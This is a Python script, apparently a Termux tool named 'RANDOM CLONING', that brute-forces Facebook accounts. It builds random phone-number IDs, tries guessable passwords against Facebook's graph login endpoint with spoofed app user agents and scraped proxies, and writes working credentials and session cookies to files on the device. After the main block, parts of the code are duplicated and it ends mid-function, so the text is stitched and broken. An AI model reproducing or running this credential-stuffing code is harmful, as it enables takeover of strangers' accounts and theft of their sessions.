import os
import sys
import json
import uuid
import string
import random
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200S","GT-3000","GT-3000X","GT-3000PRO","GT-414XOP","GT-414XOPX","GT-6918","GT-6918P","GT-7010","GT-7010X","GT-7020","GT-7020PRO","GT-7030","GT-7030X","GT-7040","GT-7040PRO","GT-7050","GT-7050X","GT-7100","GT-7100PRO","GT-7105","GT-7105X","GT-7110","GT-7110PRO","GT-7205","GT-7205X","GT-7210","GT-7210PRO","GT-7240R","GT-7240RX","GT-7245","GT-7245PRO","GT-7303","GT-7303X","GT-7310","GT-7310PRO","GT-7320","GT-7320X","GT-7325","GT-7325PRO","GT-7326","GT-7326X","GT-7340","GT-7340PRO","GT-7405","GT-7405X","GT-7550","GT-7550PRO","GT-8005","GT-8005X","GT-8010","GT-8010PRO","GT-81","GT-81X","GT-810","GT-810PRO","GT-8105","GT-8105X","GT-8110","GT-8110PRO","GT-8220S","GT-8220SX","GT-8410","GT-8410PRO","GT-9300","GT-9300X","GT-9320","GT-9320PRO","GT-93G","GT-93GX","GT-A7100","GT-A7100PRO","GT-A9500","GT-A9500X","GT-ANDROID","GT-ANDROIDX","GT-B2710","GT-B2710PRO","GT-B5330","GT-B5330X","GT-B5330B","GT-B5330BX","GT-B5330L","GT-B5330LX","GT-B5510","GT-B5510PRO","GT-B5512","GT-B5512X","GT-B5722","GT-B5722PRO","GT-B7510","GT-B7510X","GT-B7722","GT-B7722PRO","GT-B7810","GT-B7810X","GT-B9150","GT-B9150PRO","GT-B9388","GT-B9388X","GT-C3010","GT-C3010PRO","GT-C3262","GT-C3262X","GT-C3310R","GT-C3310RX","GT-C3312","GT-C3312PRO","GT-C3312R","GT-C3312RX","GT-C3313T","GT-C3313TX","GT-C3322","GT-C3322PRO","GT-C3322I","GT-C3322IX","GT-C3520","GT-C3520PRO","GT-C3520I","GT-C3520IX","GT-C3592","GT-C3592X","GT-C3595","GT-C3595PRO","GT-C3782","GT-C3782X","GT-C6712","GT-C6712PRO","GT-E1282T","GT-E1282TX","GT-E1500","GT-E1500PRO","GT-E2200","GT-E2200X","GT-E2202","GT-E2202PRO")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200S","GT-3000","GT-3000X","GT-3000PRO","GT-414XOP","GT-414XOPX","GT-6918","GT-6918P","GT-7010","GT-7010X","GT-7020","GT-7020PRO","GT-7030","GT-7030X","GT-7040","GT-7040PRO","GT-7050","GT-7050X","GT-7100","GT-7100PRO","GT-7105","GT-7105X","GT-7110","GT-7110PRO","GT-7205","GT-7205X","GT-7210","GT-7210PRO","GT-7240R","GT-7240RX","GT-7245","GT-7245PRO","GT-7303","GT-7303X","GT-7310","GT-7310PRO","GT-7320","GT-7320X","GT-7325","GT-7325PRO","GT-7326","GT-7326X","GT-7340","GT-7340PRO","GT-7405","GT-7405X","GT-7550","GT-7550PRO","GT-8005","GT-8005X","GT-8010","GT-8010PRO","GT-81","GT-81X","GT-810","GT-810PRO","GT-8105","GT-8105X","GT-8110","GT-8110PRO","GT-8220S","GT-8220SX","GT-8410","GT-8410PRO","GT-9300","GT-9300X","GT-9320","GT-9320PRO","GT-93G","GT-93GX","GT-A7100","GT-A7100PRO","GT-A9500","GT-A9500X","GT-ANDROID","GT-ANDROIDX","GT-B2710","GT-B2710PRO","GT-B5330","GT-B5330X","GT-B5330B","GT-B5330BX","GT-B5330L","GT-B5330LX","GT-B5510","GT-B5510PRO","GT-B5512","GT-B5512X","GT-B5722","GT-B5722PRO","GT-B7510","GT-B7510X","GT-B7722","GT-B7722PRO","GT-B7810","GT-B7810X","GT-B9150","GT-B9150PRO","GT-B9388","GT-B9388X","GT-C3010","GT-C3010PRO","GT-C3262","GT-C3262X","GT-C3310R","GT-C3310RX","GT-C3312","GT-C3312PRO","GT-C3312R","GT-C3312RX","GT-C3313T","GT-C3313TX","GT-C3322","GT-C3322PRO","GT-C3322I","GT-C3322IX","GT-C3520","GT-C3520PRO","GT-C3520I","GT-C3520IX","GT-C3592","GT-C3592X","GT-C3595","GT-C3595PRO","GT-C3782","GT-C3782X","GT-C6712","GT-C6712PRO","GT-E1282T","GT-E1282TX","GT-E1500","GT-E1500PRO","GT-E2200","GT-E2200X","GT-E2202","GT-E2202PRO")
try:os.system("pkg install espeak")
except:pass
os.system("git pull")
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
#__end proxy___
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\033[38;5;46m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')              
from concurrent.futures import ThreadPoolExecutor as tred
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []    

#_______________<logo>_____________        
        
    def banner(self):
        os.system("clear")
        os.system("xdg-open https://t.me/arjokerofficial_03")
        print("""
\x1b[1;92m▶𝗔𝗥
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬\033[38;5;46m░▀▀█\x1b[38;5;196m▶︎\033[38;5;46m░█▀█\x1b[38;5;196m▶\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎\033[38;5;46m░█▀▀\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴\033[38;5;46m░░░█\x1b[38;5;196m▶\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\x1b[38;5;196m▶︎\033[38;5;46m░█▀▀\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬
\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬\033[38;5;46m░▀▀░\x1b[38;5;196m▶︎\033[38;5;46m░▀▀▀\x1b[38;5;196m▶︎\033[38;5;46m░▀░▀\x1b[38;5;196m▶︎\033[38;5;46m░▀▀▀\x1b[38;5;196m▶︎\033[38;5;46m░▀░▀\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴    
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   
\x1b[1;96m▶︎WINNERS FOCUS ON WINNING, LOSERS FOCUS ON WINNERS◀︎
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━             
\033[1;35m  AUTHOR    : \033[38;5;46m𝗥𝗜𝗗𝗢𝗬 𝘅 𝗝𝗢𝗞𝗘𝗥
\033[1;35m  TOOL NAME : \033[38;5;46mRANDOM CLONING
\033[1;35m  TOOL TYPE : \033[38;5;46mFREE
\033[1;35m  VERSION   : \033[1;34m0.1 
\033[1;35m  STATUS    : \033[1;34m𝗪I𝗙I + 𝗗𝗔𝗧𝗔
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╗
\x1b[1;37mAFTER EVERY 5 MINUTE  ON/OFF AIRPLANE MODE
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝
\x1b[1;36m○●○●○●○● 𝗡 𝗘 𝗩 𝗘 𝗥  𝗚 𝗜 𝗩 𝗘  𝗨 𝗣 ○●○●○●○●
\x1b[1;96m╚══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝""")       
#__________________________<>__________________________        
    
    def Main(self):
        self.banner()
        code = input("\033[1;35m【𝟭】\x1b[1;96mRANDOM CLONING : ")
        code = input("\033[1;35m【✦】\x1b[1;96m𝟬𝟭𝟳 - 𝟬𝟭𝟴 - 𝟬𝟭𝟵 : ")
        limit = int(input("\033[1;35m【✦】\x1b[1;96m𝟭𝟬𝟬𝟬 - 𝟱𝟬𝟬𝟬 - 𝟭𝟬𝟬𝟬𝟬 - 𝟱𝟬𝟬𝟬𝟬 : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=30) as randx:
            print("\033[38;5;46mAR-RIDOY")           
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you"]
                randx.submit(self.method,ids,passlist)
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")        
        print("\n")
        print("\033[38;5;46m••••••••••••••••••••••••")    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\033[mAR-RIDOY {self.loop}|ARX|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent': ____uax____(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46mRIDOY-OK • {uid} • {pas}")
                    open("/sdcard/RIDOY-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/RIDOY-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
def FOYSAL():
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	model = random.choice([
# Infinix
'Infinix X500','Infinix X501','Infinix X505','Infinix X510','Infinix X520','Infinix X551','Infinix X559','Infinix X570',
'Infinix X573','Infinix X600','Infinix X601','Infinix X603','Infinix X604','Infinix X606','Infinix X608','Infinix X610',
'Infinix X625','Infinix X650','Infinix X652B','Infinix X655','Infinix X675','Infinix X680','Infinix X6820','Infinix X685B',
# Samsung
'Samsung GT-I9000','Samsung GT-I9100','Samsung GT-I9300','Samsung GT-I9500','Samsung SM-G900F',
'Samsung SM-G920F','Samsung SM-G925F','Samsung SM-G930F','Samsung SM-G935F','Samsung SM-G950F',
'Samsung SM-A500F','Samsung SM-A510F','Samsung SM-A700F','Samsung SM-J320F','Samsung SM-J510F','Samsung SM-N9005',
# Xiaomi
'Xiaomi Mi 2','Xiaomi Mi 3','Xiaomi Mi 4','Xiaomi Mi 5','Xiaomi Mi 6','Xiaomi Redmi 1S','Xiaomi Redmi 2',
'Xiaomi Redmi Note 2','Xiaomi Redmi Note 3','Xiaomi Redmi Note 4','Xiaomi Redmi 4X','Xiaomi Mi Max','Xiaomi Mi A1',
# Vivo
'Vivo V3','Vivo V5','Vivo V7','Vivo V9','Vivo X5','Vivo X6','Vivo X7','Vivo X9','Vivo Y51','Vivo Y53','Vivo Y65',
# Oppo
'Oppo R7','Oppo R9','Oppo R11','Oppo A37','Oppo A57','Oppo A71','Oppo F1','Oppo F3','Oppo F5','Oppo Find 7',
# Realme
'Realme 1','Realme 2','Realme C1','Realme C2','Realme 3','Realme 5','Realme X','Realme X2',
# Nokia
'Nokia 3','Nokia 5','Nokia 6','Nokia 7 Plus','Nokia 8','Nokia Lumia 520','Nokia Lumia 620','Nokia Lumia 720',
# Huawei
'Huawei P8','Huawei P9','Huawei P10','Huawei P20','Huawei Mate 7','Huawei Mate 8','Huawei Mate 9','Huawei Nova',
# Tecno
'Tecno W3','Tecno W5','Tecno W6','Tecno Camon C7','Tecno Camon CX','Tecno Spark','Tecno Spark 2'])
	buildx = random.choice(['IMM76D','IML74K','JSS15J','JZO54K','JDQ39','KOT49H','KTU84P','LMY47D','LMY47V','LMY48B','MRA58K','MMB29K','MMB29M','NMF26F','NMF26X','NRD90M','NRD90M2','NME91E','NHD90M','OPM1.171019.011','OPR1.170623.032','OPR2.170623.033','PPR1.180610.011','PPR2.180610.012','PQ1A.181205.006','PQ2A.190405.003','PQ3A.190801.002','PQ4A.190805.001','QP1A.190711.020','QP2A.190905.007','QP3A.191001.011','QP4A.191201.010','QP5A.191230.011','QRD1.200105.002','QRD2.200215.004','QRD3.200330.006','QRD4.200625.005','QRD5.200912.010','RPD1.200720.012','RPD2.201005.014','RPD3.201205.006','RP1A.200720.012','RP2A.201005.014','RP3A.201205.006','RQ1A.210105.003','RQ2A.210305.006','RQ3A.210405.010','RQ4A.210601.013','RQ5A.210812.016','SP1A.210812.016','SP2A.210915.007','SP3A.211015.009','SP4A.211105.010','SP5A.211210.013','BREAD.201203.001','CAKE.180101.001','CANDY.190505.005','DONUT.200606.010','ECLAIR.201002.003','FROYO.180405.002','GINGERBREAD.191005.004','HONEYCOMB.200208.007','ICECREAM.201105.010','JELLYBEAN.201303.009','KITKAT.201409.002','LOLLIPOP.201511.004','MARSHMALLOW.201610.005','NOUGAT.201707.006','OREO.201808.007','PIE.201909.008','ANDROID10.202001.001','UPD1.210101.001','UPD2.210202.002','UPD3.210303.003','UPD4.210404.004','UPD5.210505.005','UPD6.210606.006','UPD7.210707.007','UPD8.210808.008','UPD9.210909.009','TP1A.220101.001','TP1A.220202.002','TP1A.220303.003','TP1A.220404.004','TP1A.220505.005','TP1A.220606.006','TP1A.220707.007','TP1A.220808.008','TP1A.220909.009','SPX1.190101.001','SPX2.190202.002','SPX3.190303.003','SPX4.190404.004','SPX5.190505.005','SPX6.190606.006','SPX7.190707.007','SPX8.190808.008','SPX9.190909.009'])
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])	
	ua='Dalvik/2.1.0 (Linux; U; Android'+android_version+'; '+model+' Build/'+buildx+'; wv) [FBAN/FB4A;FBAV/'+fb_version+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fb_version_code+';FBMF/infinix;FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:null;FBDM/'+density+';FB_FW/1;]'
	return ua
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choicedensity = random.choice(['1.0', '1.5', '1.7', '2.0', '2.5', '2.25', '3.0'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['ANY','Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'])
	county_code = random.choice(["en_US", "en_GB"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["SM-G950F","SM-G960F","SM-G970F","SM-G980F","SM-G990F","SM-G930F","SM-A105F","SM-A205F","SM-A305F","SM-A315F","SM-A505F","SM-A515F","SM-A525F","SM-A705F","SM-A715F","SM-A720F","SM-A750F","SM-J260F","SM-J400F","SM-J600F","SM-J610F","SM-M105F","SM-M205F","SM-M215F","SM-M305F","SM-M315F","SM-M405F","SM-M415F","SM-M515F","M1908C3JH","M2006C3MG","M2007J20CG","M2010J19CG","M2101K7AG","2201117TG","2201116TG","M1806E7TG","M1804C3DG","M2003J15SC","M2004J19PI","M2102J20SG","M2103K19PG","M2101K9AG","M2010J19SL","220333QAG","22041219G","M1901F7G","M1908C3IC","M2003J15SS","M2004J19C","M2010J19CI","M2103K19C","M2102K20SG","M2006C3LG","M2010J19SG","M2012K11AG","RMX1941","RMX1942","RMX1943","RMX1911","RMX1921","RMX1931","RMX2020","RMX2021","RMX2001","RMX1993","RMX2151","RMX2155","RMX2156","RMX2170","RMX2180","RMX2193","RMX3081","RMX3085","RMX3201","RMX3263","RMX3195","RMX3363","CPH1803","CPH1801","CPH1909","CPH1911","CPH1937","CPH1945","CPH2001","CPH2015","CPH2021","CPH2083","CPH2127","CPH2139","CPH2159","CPH2185","CPH2217","CPH2239","CPH2273","CPH2301","V2027","V2026","V2043","V2050","V2060","V2061","V2065","V2070","V2099","V2111","V2121","V2130","V2151","V2164","V2207","V2217","V2227","V2230","XT1920","XT1921","XT1941","XT1951","XT1955","XT1962","XT2041","XT2081","XT2091","XT2125","XT2131","XT2143","XT2151","XT2165","XT2175","XT2201","TA-1021","TA-1024","TA-1032","TA-1053","TA-1083","TA-1150","TA-1174","TA-1188","TA-1207","TA-1234","TA-1258","TA-1283","TA-1322","TA-1335","TA-1403","ANE-LX1","POT-LX1","LDN-L21","JAT-LX1","STK-L21","PRA-LX1","MAR-LX1","DUB-LX1","YAL-L21","LYA-L29","VOG-L29","ELS-L21","X650","X655","X657","X680","X682","X688","X690","X695","X697","X701","X703","X705","X707","X6815","X6821","KC1","KC2","KD6","KE5","KE6","KE7","KF6","KF7","CH6","CH7","CE7","CE9","BD2","BD3","BD4"])    
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/infinix;FBBD/infinix;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/tecno;FBBD/tecno;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
	return random.choice([user_agent1,user_agent2])       
def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/399.9.7.4;FBBV/94378475;FBDM={density=1.6,width=720,height=1920};FBLC/en_US;FBRV/126388027;FBCR/unknown;FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/Mate 30;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;FBNET/WiFi;]"
        ua2 = "[FBAN/FB4A;FBAV/349.6.1.8;FBBV/40291457;FBDM={density=2.0,width=720,height=1920};FBLC/en_US;FBRV/524782409;FBCR/unknown;FBMF/infinix;FBBD/infinix;FBPN/com.facebook.orca;FBDV/X683;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;FBNET/WiFi;]"
        ua3 = "[FBAN/FB4A;FBAV/284.9.9.7;FBBV/92127535;FBDM={density=3.4,width=720,height=1920};FBLC/en_US;FBRV/230548409;FBCR/unknown;FBMF/tecno;FBBD/tecno;FBPN/com.facebook.katana;FBDV/Phantom X;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;FBNET/MOBILE_DATA;]"
        ua4 = "[FBAN/FB4A;FBAV/221.9.7.7;FBBV/60150569;FBDM={density=3.4,width=1080,height=1920};FBLC/en_US;FBRV/266391686;FBCR/unknown;FBMF/infinix;FBBD/infinix;FBPN/com.facebook.orca;FBDV/X6815C;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;FBNET/MOBILE_DATA;]"
        ua5 = "[FBAN/FB4A;FBAV/358.4.7.12;FBBV/31711279;FBDM={density=1.8,width=1080,height=1280};FBLC/en_US;FBRV/825224372;FBCR/unknown;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A51;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBNET/MOBILE_DATA;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)
if __name__ == "__main__":
    Mr_Code().Main()                head = {
                'User-Agent': ____uax____(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46mRIDOY-OK • {uid} • {pas}")
                    open("/sdcard/RIDOY-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/RIDOY-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
def FOYSAL():
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	model=random.choice(['Infinix X677','Infinix X680','Infinix X6850B','Infinix X6525','Infinix X6820','Infinix X677','Infinix X6851B','Infinix X676B','Infinix X559C','Infinix X608','Infinix X606B'])
	buildx=random.choice(['SP1A.210812.016','QP1A.190711.020','UP1A.231005.007','TP1A.220624.014','UP1A.231005.007','NRD90M','OPR1.170623.032','O11019','MRA58K'])
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])	
	ua='Dalvik/2.1.0 (Linux; U; Android'+android_version+'; '+model+' Build/'+buildx+'; wv) [FBAN/FB4A;FBAV/'+fb_version+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fb_version_code+';FBMF/samsung;FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:null;FBDM/'+density+';FB_FW/1;]'
	return ua
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choicedensity = random.choice(['1.0', '1.5', '1.7', '2.0', '2.5', '2.25', '3.0'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'])
	county_code = random.choice(["en_US", "en_GB"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["RMX1945","RMX1911","RMX2193","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX3263","RMX2155","RMX3195","RMX1993"])
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
